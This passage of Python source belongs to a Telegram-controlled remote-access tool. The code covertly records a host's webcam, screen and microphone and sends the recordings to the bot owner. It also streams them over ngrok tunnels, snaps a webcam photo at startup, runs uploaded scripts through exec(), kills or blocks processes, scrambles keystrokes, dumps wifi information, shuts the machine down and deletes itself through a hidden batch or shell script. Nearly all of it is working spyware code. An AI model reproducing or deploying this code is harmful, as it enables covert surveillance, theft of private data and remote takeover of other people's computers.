            self.bsend(f"Invalid command {command}")


    def parse_document(self, msg: dict[str:str], mimetype: str="document") -> None:
        document = msg[mimetype]
        file_id = document["file_id"]
        saved_filename = randomname()
        saved_filepath = join(BURN_DIRECTORY, saved_filename)
        self.bot.download_file(file_id, saved_filepath)
        if mimetype == "document": 
            filename = document["file_name"]
            if filename.endswith(".dd"):
                with open(saved_filepath, "r") as fi:
                    content = fi.read()
                payload_python = toducky(content)
                self.bsend(f"Executing duckyscript {filename}({saved_filename})")
                exec(payload_python)
                remove(saved_filepath)

        elif mimetype == "video":
            caption = msg["caption"].lower().strip()
            if caption == "/setvideowallpaper":
                if not self.confirmContuinuingWithoutWallpaperBackup():
                    return
                duration = document["duration"]
                video_stream = VideoCapture(saved_filepath)
                res = True
                start=time()
                while res and (time()-start)<=duration:
                    res, frame = video_stream.read()
                    imwrite("tmp.png", frame)
                    change_wallpaper(abspath("tmp.png"))
                remove("tmp.png")
                self.restore_wallpaper()
            
            elif caption.startswith("/save"):
                try:
                    args = caption.split()
                    if len(args)>1:
                        filepath = " ".join(caption.split()[1:])
                        containts_filename = "." in pathsplit(filepath)[-1]
                        if containts_filename:
                            rename(saved_filepath, filepath)
                        else:
                            rename(saved_filepath, join(filepath, saved_filename+".mp4"))
                        self.bsend(f"{emoji_dict['file']} File saved successfully.")
                        return
                except Exception as e:
                    self.bsend(f"{emoji_dict['file']} Could not save the file. {e}")
                    return

        elif mimetype == "video_note":
            cap = VideoCapture(saved_filepath)
            while True:
                ret, frame = cap.read()
                if not ret:
                    break
                imshow("Video", frame)
                waitKey(25)
                setWindowProperty("Video", WINDOW_FULLSCREEN, 1)
            cap.release()
            destroyAllWindows()

    def parse_photo(self, msg: dict) -> None:
        filename = randompngname()
        saved_filepath = join(BURN_DIRECTORY, filename)
        self.bot.download_file(msg['photo'][-1]['file_id'], saved_filepath)
        if "caption" in msg.keys():
            caption = msg["caption"]
            if caption == "/jumpscare":
                self.jumpscare(saved_filepath)
                return

            elif caption.startswith("/save"):
                try:
                    args = caption.split()
                    if len(args)>1:
                        filepath = " ".join(caption.split()[1:])
                        containts_filename = "." in pathsplit(filepath)[-1]
                        if containts_filename:
                            rename(saved_filepath, filepath)
                        else:
                            rename(saved_filepath, join(filepath, filename))
                        self.bsend(f"{emoji_dict['file']} File saved successfully.")
                        return
                except Exception as e:
                    self.bsend(f"{emoji_dict['file']} Could not save the file. {e}")
                    return

        Thread(target=self.show_image, args=[filepath,]).start()
        sleep(0.5)
        remove(filepath)

    def parse_text(self, msg: dict) -> None:
        text = msg["text"]
        date = int(msg["date"])
        if (date+self.message_timeout)<time():
            return
        if self.user["status"] is None:
            if text == "/start":
                return None
            elif ";" in text:
                commands = text.split(";")
                for command in commands:
                    self.parse_command(command) 
            else:
                self.parse_command(text)
        elif self.user["status"] == "input_requested":
            self.user["last_response"] = text.strip()

    def plankton(self, audio=True) -> None:
        self.jumpscare("plankton_meme", "plankton", playaudio=audio, setvolume=50)

    def planktonnoaudio(self) -> None:
        self.plankton(audio=False)
    
    def processmonitoradd(self, processname: str) -> None:
        self.bsend(f"💻 {processname} added to process monitor's list.")
        self.processmonitorlist.update({processname:False})
    
    def processmonitorrem(self, processname: str) -> None:
        try:
            del self.processmonitorlist[processname]
            self.bsend(f"💻 {processname} removed to process monitor's list.")
        except:
            self.bsend(f"💻 {processname} was not inside process monitor's list.")

    def processmonitormenushow(self) -> None:
        self.processmonitormenu = self.new_menu({
            x:f"PROCMON_procmonrem {x}" for x, _ in self.processmonitorlist.items()
        }, close_btn_lab="PROCMON_close")

    def processmonitorloop(self) -> None:
        while self.running:
            for process, checked in self.processmonitorlist.items():
                if self.check_if_proc_running(process) and not checked:
                    self.bsend(f"{process} is running.")
                    self.processmonitorlist[process]=True
                elif not(self.check_if_proc_running(process)):
                    self.processmonitorlist[process]=False
            sleep(2)

    def process_killer(self, page=0) -> None:
        if self.process_explorer_menu is None:
            self.process_killer_page = 0
        else:
            self.process_explorer_menu.delete()
            self.process_killer_page = page
        processes = [x.name() for x in psutil.process_iter()] 
        self.process_explorer_menu = self.new_menu({process:f"/terminateprocess {process}" for process in processes}, next_btn=True, autosend=True, page=self.process_killer_page, next_btn_lab="PK_next_page", prev_btn_lab="PK_previous_page", close_btn_lab="PK_close_page", rows=3)
        return self.process_explorer_menu

    def pss(self) -> None:
        self.__play_loaded_sound("pss")

    def replyquickmenu(self) -> int:
        commands = list(map(lambda x: f"/{x['command']}", self.commands))
        keyboard = [commands[i:i + 2] for i in range(0, len(commands), 2)]        
        return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)

    def randomkeyboard(self, timeout: int =5) -> None:
        start = time()
        loading_bar = self.new_loading_bar(timeout, label=f"{emoji_dict['keyboard']} Random Keyboard", showperc=True)
        while (time()-start)<timeout:
            loading_bar.update(time()-start)
            event = read_event()
            if event.event_type == KEY_DOWN:
                e = event.name.split()[0]
                if e in printable:
                    pg.press("backspace")
                    pg.write(choice(printable))
        loading_bar.set100()
        loading_bar.delete()

    def record_audio(self, filename, seconds, samplerate=48000) -> bool|Exception:
        try:
            seconds = float(seconds)
            frames = int(seconds * samplerate)
            data = sd.rec(frames, samplerate=samplerate, channels=1, dtype='int16')
            sd.wait()
            sf.write(filename, data, samplerate)
            return True
        except Exception as e:
            return e 

    def record_jumpscare_reaction(self, onlycamera=False) -> None:
        if onlycamera:
            recording_thread = Thread(target=self.record_webcam, args=(20,))
        else:
            recording_thread = Thread(target=self.record_webcam_and_screen, args=(20,))

        recording_thread.start()
        status_message = self.new_editable_message("Recording")
        sleep(10)
        self.jumpscare(playaudio=True)
        status_message.edit("Jumpscared!")
        recording_thread.join()
        status_message.delete()

    def record_screen(self, duration: int=10, caption: str|None=None) -> None:
        duration = int(duration)
        bar = self.new_loading_bar(duration, label=f"{emoji_dict['screen']} Recording Screen")
        try:
            filename = join(f"{BURN_DIRECTORY}", f"{randomname()}.mp4")
            audio_filename = join(f"{BURN_DIRECTORY}",f"{randomname()}.wav")
            SCREEN_SIZE = tuple(pg.size())
            fourcc = VideoWriter_fourcc(*'XVID')
            out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
            start_time = time()
            samplerate = 44100
            channels = 1
            frames = int(duration * samplerate)
            audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')

            time_elapsed = 0
            while int(time_elapsed) < duration:
                time_elapsed = time() - start_time
                bar.progress = time_elapsed
                bar.update()
                img = pg.screenshot()
                img = np.array(img)
                img = cvtColor(img, COLOR_BGR2RGB)
                out.write(img)
            bar.set100()

            sd.wait()
            out.release()
            sf.write(audio_filename, audio_data, samplerate)
            video_clip = VideoFileClip(filename)
            audio_clip = AudioFileClip(audio_filename)
            video_with_audio = video_clip.set_audio(audio_clip)
            final_filename = filename.replace(".mp4", "_final.mp4")
            video_with_audio.write_videofile(final_filename, logger=None)
            tmploadingmessage = self.new_editable_message("Sending recording...", True)
            with open(final_filename, "rb") as video:
                response = self.bot.sendVideo(self.owner_id, video, caption=caption)
                self.all_session_messages.append(response["message_id"])
            tmploadingmessage.delete()
            remove(filename)
            remove(audio_filename)
            remove(final_filename)
        except Exception as e:
            self.bsend(f"Error while recording screen: {e}")
        bar.fill_and_delete()

    def record_webcam(self, duration: int=10, caption: str|None=None) -> None:
        duration = int(duration)
        bar = self.new_loading_bar(duration, label=f"{emoji_dict['photo']} Recording Webcam")
        try:
            filename = join(f"{BURN_DIRECTORY}", f"{randomname()}.mp4")
            audio_filename = join(f"{BURN_DIRECTORY}",f"{randomname()}.wav")
            fourcc = VideoWriter_fourcc(*'XVID')
            self.opencap()
            webcam = self.cap
            width = int(webcam.get(CAP_PROP_FRAME_WIDTH))
            height = int(webcam.get(CAP_PROP_FRAME_HEIGHT))
            out = VideoWriter(filename, fourcc, 20.0, (width, height))
            start_time = time()
            samplerate = 44100
            channels = 1
            frames = int(duration * samplerate)
            audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')
            time_elapsed = 0
            while int(time_elapsed) < duration:
                time_elapsed = time() - start_time
                bar.progress = time_elapsed
                bar.update()
                ret, frame = webcam.read()
                if not ret:
                    break
                out.write(frame)
            bar.set100()
            sd.wait()
            out.release()
            self.closecap()
            sf.write(audio_filename, audio_data, samplerate)
            video_clip = VideoFileClip(filename)
            audio_clip = AudioFileClip(audio_filename)
            video_with_audio = video_clip.set_audio(audio_clip)
            final_filename = filename.replace(".mp4", "_final.mp4")
            video_with_audio.write_videofile(final_filename, logger=None)
            tmploadingmessage = self.new_editable_message("Sending recording...", True)
            with open(final_filename, "rb") as video:
                response = self.bot.sendVideo(self.owner_id, video, caption=caption)
                self.all_session_messages.append(response["message_id"])
            tmploadingmessage.delete()
            remove(filename)
            remove(audio_filename)
            remove(final_filename)
        except Exception as e:
            self.bsend(f"Error while recording webcam {e}")
        bar.fill_and_delete()

    #This code is like an impressive skycraper held by a little wire.

    def record_webcam_and_screen(self, capture_duration: int=10, caption: str|None=None) -> None:
        capture_duration = int(capture_duration)
        bar = self.new_loading_bar(capture_duration, label=f"{emoji_dict['photo']}{emoji_dict['screen']} Recording Webcam&Screen")
        try:
            filename = join(BURN_DIRECTORY, randomname()+".mp4")
            audio_filename = join(BURN_DIRECTORY, randomname()+".wav")
            SCREEN_SIZE = tuple(pg.size())
            fourcc = VideoWriter_fourcc(*'XVID')
            out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
            self.opencap()
            webcam = self.cap
            start_time = time()
            samplerate = 44100
            channels = 1
            frames = int(capture_duration * samplerate)
            audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')

            time_elapsed = 0 
            while int(time_elapsed) < capture_duration:
                time_elapsed = time() - start_time
                bar.progress = time_elapsed
                bar.update()
                img = pg.screenshot()
                img = np.array(img)
                img = cvtColor(img, COLOR_BGR2RGB)
                _, frame = webcam.read()
                fr_height, fr_width, _ = frame.shape
                frame = resize(frame, (fr_width//2, fr_height//2))
                fr_height, fr_width, _ = frame.shape
                img[0:fr_height, 0:fr_width, :] = frame[0:fr_height, 0:fr_width, :]
                out.write(img)
            bar.set100()
            sd.wait()
            out.release()
            self.closecap()
            sf.write(audio_filename, audio_data, samplerate)
            video_clip = VideoFileClip(filename)
            audio_clip = AudioFileClip(audio_filename)
            video_with_audio = video_clip.set_audio(audio_clip)
            final_filename = filename.replace(".mp4", "_final.mp4")      #this was torture
            video_with_audio.write_videofile(final_filename, logger=None)#someone must pay for this
            tmploadingmessage = self.new_editable_message("Sending recording...", True)
            with open(final_filename, "rb") as video:
                response = self.bot.sendVideo(self.owner_id, video, caption=caption)
                self.all_session_messages.append(response["message_id"])
            tmploadingmessage.delete()
            remove(filename)
            remove(audio_filename)
            remove(final_filename)
        except Exception as e:
            e = traceback.format_exc()
            self.bsend(f"Error while sending video clip\n{e}")
        bar.fill_and_delete()

    def removefromcantopen(self, process: str) -> None:
        self.cantopenmenu_ref.delete()
        self.cantopenlist.remove(process)
        self.cantopenmenu()
        self.bsend(f"🔒 Removed {process} to cantopenlist.")

    def restore_wallpaper(self) -> None:
        if self.backup_wallpaper_path:
            self.bsend("Wallpaper backup was not created so restoring it is not currently possible.")
            return
        change_wallpaper(self.backup_wallpaper_path)

    def rightclick(self) -> None:
        pg.rightClick() #no shit

    def screenshot(self) -> int:
        try:
            filename = join(BURN_DIRECTORY,randompngname())
            screenshot = pg.screenshot()
            screenshot.save(filename)
            message_id = self.__send_image(filename)
            remove(filename)
            return message_id
        except Exception as e:
            return self.bsend(f"Error while getting screenshot\n{e}")

    def selfie(self, caption: str|None=None, reply_markup=None) -> None:
        try:
            filename = join(BURN_DIRECTORY,randompngname())
            self.opencap()
            camera = self.cap
            return_value, image = camera.read()
            if not return_value:
                raise Exception("Could not find camera")
            imwrite(filename, image)
            response = self.bot.sendPhoto(self.owner_id, open(filename, "rb"), caption=caption, reply_markup=reply_markup)
            self.all_session_messages.append(response["message_id"])
            remove(filename)
            self.closecap()
            return True
        except Exception as e:
            self.bsend(f"Something has happened while getting webcam\n {e}")
            return False

    def send_record_audio(self, seconds: int=5, caption: str|None=None) -> None:
        message = self.new_editable_message(f"{emoji_dict['microphone']} Recording audio of {seconds} seconds.")
        filename = randomname()+".wav"
        filepath = join(BURN_DIRECTORY, filename)
        res = self.record_audio(filepath, seconds)
        if isinstance(res, Exception):
            err = f"Error while recording audio: {res}"
            self.bsend(err)
        else:
            message.edit("Done recording, sending...")
            filepath = wav_to_ogg(filepath, rmold=True)
            with open(filepath, "rb") as fi:
                self.bot.sendVoice(self.owner_id, fi, caption=caption)
            remove(filepath)
            message.delete()

    def confirmContuinuingWithoutWallpaperBackup(self):
        if not self.backup_wallpaper_path:
            return self.ask_yesno("The program was unable to backup the wallpaper, do you still want to use this functionality Y/n")
        else:
            return True

    def setCameraAsWallpaper(self, seconds: float|int=5):
        if not self.confirmContuinuingWithoutWallpaperBackup():
            return
        seconds = int(seconds)
        loading_bar = self.new_loading_bar(label=f"{emoji_dict['camera']}{emoji_dict['screen']} Set Camera As Wallpaper", total=seconds, showperc=True)
        filename = join(BURN_DIRECTORY, "jxframe.png")
        start = time()
        res = True
        self.opencap()
        while time()-start <= seconds and res:
            loading_bar.update(time()-start)
            res, frame = self.cap.read()
            frame = pad_to_16_9(frame)
            imwrite(filename, frame)
            change_wallpaper(filename)
        loading_bar.set100()
        self.closecap()
        sleep(1)
        try:
            remove(filename)
        except FileNotFoundError:
            ...
        loading_bar.delete()
        self.restore_wallpaper()

    def set_volume(self, volume):
        if volume in range(0, 101):
            self.audio_mixer.setVolumePercentage(volume)
        else:
            self.bsend(f"Volume must be from 0.0 to 100.0")

    def setvideowallpaper(self, videofilename: str) -> None:
        if not self.confirmContuinuingWithoutWallpaperBackup():
            return
        res = True
        filename = join(BURN_DIRECTORY, "jxframe.png")
        backup_filename = join(BURN_DIRECTORY, "backup.png")
        self.opencap()
        video = VideoCapture(abspath(videofilename))
        while res:
            res, frame = video.read()
            imwrite(frame)
            change_wallpaper(filename)
        change_wallpaper(backup_filename)
        remove(filename)
        remove(backup_filename)
        self.closecap()
        self.restore_wallpaper()

    def selfdestruction(self) -> None:
        if not self.ask_yesno():
            self.bsend("Operation stopped.")
            return
        current_file = realpath(sys.argv[0])
        temp_dir = gettempdir()
        if iswindows:
            bat_file = join(temp_dir, "delete_me.bat")
            with open(bat_file, "w") as f:
                f.write(f':loop\ndel "{current_file}" > nul\nif exist "{current_file}" goto loop\ndel "%~f0"')
            Popen(['cmd', '/c', bat_file], creationflags=CREATE_NO_WINDOW)
        else:
            sh_file = join(temp_dir, "delete_me.sh")
            with open(sh_file, "w") as f:
                f.write(f'#!/bin/sh\nTARGET="{current_file}"\nwhile [ -e "$TARGET" ]; do\n\trm "$TARGET"\n\tsleep 0.5\n\tdone\n\trm -- "$0"')
                # :(
            chmod(sh_file, 0o700)
            Popen(['sh', sh_file]) 
        self.bsend(f"🛑 Removing executable.")
        self.stop()

    def show_image(self, image_path: str) -> None:
        try:
            imshow("Warning", resize(imread(image_path), (400, 400)))
            setWindowProperty("Warning", WND_PROP_TOPMOST, 1)
            waitKey(0)
            destroyWindow("Warning")
            remove(image_path)
        except Exception as e:
            self.bsend(f"Error while trying to show image: \n{e}")

    def shutdown(self, seconds=0) -> None:
        if not self.ask_yesno():
            self.bsend("Operation stopped.")
            return
        system(f"shutdown -s -t {seconds}")

    def spam_windows(self, n: int, text: str) -> None:
        for i in range(n):
            sp_win = Thread(target=self.message_box, args=["Warning", text,])
            sp_win.start()
    
    def stop_webcam_and_screen_tunnel(self) -> None:
        if self.webcam_and_screen_url:
            self.tunnelhandler.stop_service("webcamandscreen")
            self.webcam_and_screen_url = None
            self.bsend(f"{emoji_dict['photo']}{emoji_dict['screen']} Webcam&Screen tunnel closed")
        else:
            self.bsend(f"{emoji_dict['photo']}{emoji_dict['screen']} You have no screen tunnel opened")
    
    def stop_webcam_tunnel(self) -> None:
        if self.webcam_url:
            self.closecap()
            self.tunnelhandler.stop_service("webcam")
            self.webcam_url = None
            self.bsend(f"{emoji_dict['photo']} Webcam tunnel closed")
        else:
            self.bsend(f"{emoji_dict['photo']} You have no webcam tunnel opened")

    def stop_screen_tunnel(self) -> None:
        if self.screen_url:
            self.tunnelhandler.stop_service("screen")
            self.screen_url = None
            self.bsend(f"{emoji_dict['screen']} Screen tunnel closed")
        else:
            self.bsend(f"{emoji_dict['screen']} You have no screen tunnel opened")

    def start_webcam_and_screen_tunnel(self) -> None:
        if self.can_use_ngrok and self.webcam_and_screen_url is None:
            self.webcam_and_screen_url = self.tunnelhandler.start_webcam_and_screen_stream(cap=self.cap)
            self.bsend(f"{emoji_dict['photo']}{emoji_dict['screen']} Webcam&Screen Tunnel url: {self.webcam_and_screen_url}")

        elif self.can_use_ngrok and not(self.webcam_and_screen_url is None):
            self.bsend(f"{emoji_dict['photo']}{emoji_dict['screen']} Webcam&Screen Tunnel url: {self.webcam_and_screen_url}")

        else:
            self.bsend("You cant use tunnel because you didn't provide a ngrok token.")

    def start_webcam_tunnel(self) -> None:
        if self.can_use_ngrok and self.webcam_url is None:
            self.webcam_url = self.tunnelhandler.start_webcam_stream(cap=self.cap)
            self.bsend(f"{emoji_dict['photo']} Webcam Tunnel url: {self.webcam_url}")

        elif self.can_use_ngrok and not(self.webcam_url is None):
            self.bsend(f"{emoji_dict['photo']} Webcam Tunnel url: {self.webcam_url}")

        else:
            self.bsend("You cant use tunnel because you didn't provide a ngrok token.")

    def start_screen_tunnel(self) -> None:
        if self.can_use_ngrok and self.screen_url is None:
            self.screen_url = self.tunnelhandler.start_screen_stream()
            self.bsend(f"{emoji_dict['screen']} Screen Tunnel url: {self.screen_url}")

        elif self.can_use_ngrok and not (self.screen_url is None):
            self.bsend(f"{emoji_dict['screen']} Screen Tunnel url: {self.screen_url}")

        else:
            self.bsend("You cant use tunnel because you didn't provide a ngrok token.")

    def send_prompt(self, question: str) -> str:
        self.bsend(question)
        self.user["status"]="input_requested"
        self.user["last_response"]=None
        while not self.user["last_response"]:
            sleep(1)
        else:
            tmp = self.user["last_response"]
            self.user["last_response"]=None
            self.user["status"] = None
            return tmp

    def start(self) -> None:
        STARTING_LOG_MESSAGE = self.new_editable_message("STARTING")
        #Getting rid of old shi
        try:
            self.bot.deleteWebhook()
        except MaxRetryError:
            #don't care
            ...
        STARTING_LOG_MESSAGE.edit("DELETED WEBHOOK")

        self.bot.getUpdates()
        STARTING_LOG_MESSAGE.edit("GOT UPDATES")

        self.images = load_images()
        STARTING_LOG_MESSAGE.edit("GOT IMAGES")

        self.update_commands()
        STARTING_LOG_MESSAGE.edit("GOT COMMANDS")

        nomemes = list(self.images.copy().keys())
        self.nomemes = list(filter(lambda x: x.startswith("jmp"), nomemes))

        self.audios = load_audios()
        STARTING_LOG_MESSAGE.edit("AUDIOS LOADED")

        curr_wallpaper_path = get_current_wallpaper()
        if curr_wallpaper_path:
            self.backup_wallpaper_path = join(BURN_DIRECTORY, curr_wallpaper_path)
        else:
            self.backup_wallpaper_path = None
        STARTING_LOG_MESSAGE.edit("WALLPAPER BACKED UP")

        self.cantopenthread = Thread(target=self.cantopenkiller)
        self.cantopenthread.start()
        STARTING_LOG_MESSAGE.edit("PROGRAM KILLER STARTED")

        self.processmonthread = Thread(target=self.processmonitorloop)
        self.processmonthread.start()
        STARTING_LOG_MESSAGE.edit("PROCESS MONITOR STARTED")

        self.screen_width, self.screen_height = pg.size()
        STARTING_LOG_MESSAGE.edit("GOT SCREEN SIZE")
        botstartedmessage = f"Bot started now, you have acces to 👤{getlogin()}"
        if not sys.argv[1:]:
            if not self.selfie(botstartedmessage, reply_markup=self.replyquickmenu()):
                self.bsend(botstartedmessage, reply_markup=self.replyquickmenu())
        else:
            self.bsend(botstartedmessage, reply_markup=self.replyquickmenu())
        loop = MessageLoop(self.bot, {"chat":self.handle, "callback_query":self.on_callback_query})
        loop.run_as_thread()
        STARTING_LOG_MESSAGE.edit("STARTED MESSAGE LOOP")
        STARTING_LOG_MESSAGE.delete() #Weeeeeeeeeeeee
        while self.running:
            try:
                sleep(1)
            except KeyboardInterrupt:
                self.bsend("🛑 Interrupted by host machine, bye bye.")
                self.running = False

    def stop(self) -> None:
        if self.ask_yesno():
            self.running = False
            self.clear()
            self.bsend("🛑 Interrupted by you, bye bye.")
            self.stop_screen_tunnel()
            self.stop_webcam_tunnel()
            sys.exit()
        else:
            self.bsend("Operation stopped.")

    def test(self) -> None: #this is a test command used for test purpuses, can be used with /test
        ...

    def update_commands(self) -> bool:
        self.commands = self.extract_commands()
        url = f'https://api.telegram.org/bot{self.token}/setMyCommands'
        payload = {'commands': self.commands}
        response = requests.post(url, json=payload)
        return response.status_code == 200

    def waitforface(self, timeout=60):
        start = time()
        self.opencap()
        cap = self.cap
        while time()-start < timeout:
            res, frame = detect_face(cap)
            if frame is None:
                self.bsend("Face recognition model not loaded properly.")
                break
            if res:
                filename = randompngname()
                imwrite(filename, frame)
                self.__send_image(filename)
                remove(filename)
                break
        self.closecap()

    def wifiinfo(self) -> None:
        self.bsend(f"🌐 *Wifi-Info*\n\n{str(self.wifidumper)}", parse_mode="markdown")

"""
ooo        ooooo            o8o
`88.       .888'            `"'
 888b     d'888   .oooo.   oooo  ooo. .oo.   
 8 Y88. .P  888  `P  )88b  `888  `888P"Y88b  
 8  `888'   888   .oP"888   888   888   888  
 8    Y     888  d8(  888   888   888   888  
o8o        o888o `Y888""8o o888o o888o o888o 
"""

if __name__ == "__main__":
    token, chat_id, ngrok_token = getCred() 
    mixer = CustomMixer()
    capture = VideoCapture(0)
    signal_error = ""
    try:
        pyngrok.process.subprocess.Popen = _patched_popen
        try:
            if ngrok_token.strip():
                terminate_process_by_name("ngrok.exe")
                ngrok.set_auth_token(ngrok_token)
                close_all_tunnels(ngrok)
        except pyngrok.exception.PyngrokNgrokError as e:
                sleep(2)
                terminate_process_by_name("ngrok.exe")
                signal_error += f"Ngrok Error: {e}\n"
                ngrok_token = None
    except Exception as e:
        signal_error += f"Unhandled exception: {e}"
    pep2 = PeppinoTelegram(token,chat_id,ngrok_token,mixer,capture,loading_bar_set=[emoji_dict["progress"],emoji_dict["empty_progress"]],loading_bar_spinner=all_spinners["circle_dots"])
    # I wanted to make this multiple user but the code has become too hard to maintain.
    pep2.start()
